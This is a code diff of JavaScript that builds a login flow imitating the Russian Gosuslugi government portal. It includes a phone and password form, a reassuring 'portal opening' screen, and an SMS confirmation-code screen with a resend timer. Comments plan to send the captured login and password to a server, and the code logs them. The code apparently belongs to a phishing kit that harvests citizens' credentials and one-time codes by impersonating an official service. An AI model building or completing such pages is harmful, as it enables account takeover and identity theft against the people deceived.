@@ -6,7 +6,7 @@ if(typeof GSspace !== "undefined"){
 	const firstForm = "<div id='placement' class='fl cl'><div id='headerPage' class='fl sb'><div class='headIcon'><img src='./img/max.png' id='maxGpt'></div><div class='headIcon'><img src='./img/gosscan.png' id='gosScan'></div></div><div id='centralLogo'><img src='./img/logo.png'></div><div id='footerPage'><div><button id='signInButt'>Войти</button></div><div><button id='signUpButt'>Зарегистрироваться</button></div></div></div>";
 	const secondForm = "<div id='realLogin' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl'><div id='rusTag'>Русский</div><div id='rusFlag'><img src='./img/rusFlag.png'></div></div><div id='loginPlace'><div class='strokaInput'><div class='headInput'>Телефон </div><input type='tel' id='login' placeholder='Телефон ' autocomplete='off'></div></div><div id='passPlace'><div class='strokaInput'><div class='headInput'>Пароль </div><input type='password' id='password' placeholder='Пароль ' autocomplete='off'></div></div><div id=''><div class='strokaInput'><div id='resText'>Восстановить</div></div></div><div id=''><div class='strokaInput'><button id='signInButt'>Войти</button></div></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не удается войти?</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a>Зарегистрироваться</a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
 	const thirdForm = "<div class='fl cs'><div id='dopHeader'><div id='preHeaderTitul'>Идёт загрузка...</div></div><div id='progressBar'><div id='progressLine'></div></div><div id='progressLogoBar'><div id='preLogoTitul'><img src='./img/logo2.jpg'></div></div><div id='dopBody'><div id='preMess' class='fl'><div id='preMessForm'><div id='sysMessTitul' class='stroka'>Госуслуги сейчас откроются</div><div id='sysMessText' class='stroka'>Портал работает в прежднем режиме. Подождите пару секунд.</div><div id='sysMessLoader'><img src='./img/loader.png'></div></div></div></div></div></div>";
-	const fourthForm = "<div id='tempCode' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl ac'><div id='trustTitul'>Подтвердите вход </div><div id='messTrust'></div><div id='telTrust'></div></div><div id=''><div id='titulCode'><div>Код подтверждения</div></div></div><div id='loginPlace'><div class='strokaInput fl'><input type='text' class='tCode tact' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'></div></div><div id=''><div id='tCodeTrust'>Отправить повторно через</div></div><div id=''><div id='tTimer'>00:59</div></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не могу подтвердить вход</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a></a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
+	const fourthForm = "<div id='tempCode' class='fl cs'><div id='dopHeader'><div id='dopHeaderTitul'>Авторизация</div><div id='backForm'><img src='./img/arrBack.png'></div></div><div id='dopBody'><div id='bodyBubble'><div id='backSUpBut'><img src='./img/arrBackS.png'></div><div id='bodyLogo'><img src='./img/logo2.jpg'></div><div id='rusTagForm' class='fl ac'><div id='trustTitul'>Подтвердите вход </div><div id='messTrust'></div><div id='telTrust'></div></div><div id=''><div id='titulCode'><div>Код подтверждения</div></div></div><div id='loginPlace'><div class='strokaInput fl'><input type='text' class='tCode tact' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'><input type='text' class='tCode' placeholder='' autocomplete='off' maxlength='1'></div></div><div id='tTimerReq'></div><div id='tTimerVal'></div><div id=''><div class='strokaInput'><button id='restoreInform'>Не могу подтвердить вход</button></div></div></div><div id='bodyFooter'><div class='strokaInput'><div id='regUpButton'><a></a></div></div></div></div><div id='dopFooter'><div id='bodyBubble'><div><div id='logFooterMark'><img src='./img/mark.png'></div></div><div><div id='logFooterText'>Куда еще можно зайти с паролем от Госуслуг?</div></div></div></div></div>";
 	//Телефон / Email / СНИЛС
 
 	function loadingSpace(){//главная функция, при загрузке страницы
@@ -105,15 +105,46 @@ if(typeof GSspace !== "undefined"){
 	function authorisation(e,k){//авторизация
 		if(e.value != '' && k.value != ''){
 			console.log(e.value + " | "+ k.value);
+			//проверка логина на валидность | длинна логина, убрать запрещенные символы, оставить только текст
+			//отправка лог&пасс на сервер
 			var loginFormPlace = document.querySelector("#mainPlace");
 			loginFormPlace.insertAdjacentHTML("beforeend", fourthForm);
 			document.querySelector("#trustTitul").insertAdjacentText("beforeend", "по смс");
 			document.querySelector("#messTrust").insertAdjacentText("beforeend", "Код подтверждения отправлен на номер");
 			document.querySelector("#telTrust").textContent = e.value; //+7 951 ***-**-15
+			
+			reloadTimerforSendData();
+			pinKodeGen();
 		}else{
 			console.log("незаполнены поля");
 			aMessages("Ошибка!","Не заполнены одно или оба обязательных поля. Повторите попытку еще раз.",2);
 		}
+	}
+	function reloadTimerforSendData(){//перезапуск timer
+		if(document.querySelector("#timerReload")){
+			document.querySelector("#timerReload").remove();
+		}
+		document.querySelector("#tTimerReq").insertAdjacentHTML("afterbegin", "<div id='tCodeTrust'>Отправить повторно через</div>");
+		document.querySelector("#tTimerVal").insertAdjacentHTML("afterbegin", "<div id='tTimer'>00:59</div>");
+
+		var count = 58, timer = setInterval(function(){
+			var tik = count--;
+			if(tik.toString().length < 2){
+				tik = "0"+tik;
+			}				
+			var timerVal = document.querySelector("#tTimer").textContent = "00:"+tik;
+			if(count == 0){
+				clearInterval(timer);
+				document.querySelector("#tTimer").remove();
+				document.querySelector("#tCodeTrust").innerHTML = "";
+				document.querySelector("#tCodeTrust").insertAdjacentHTML("afterbegin", "<a id='timerReload'>Отправить повторно</a>");
+				document.querySelector("#timerReload").addEventListener(typeTap, (e) => reloadTimerforSendData());
+			}				
+			
+		}, 1000);	
+	}
+	function pinKodeGen(){//функция обработки пинкода, его ввода и стилистические изменения
+		
 	}
 	function loadRegForm(){//выскакивающий подвал пререгистрации
 		var regPreFormPlace = document.querySelector("#mainPlace");
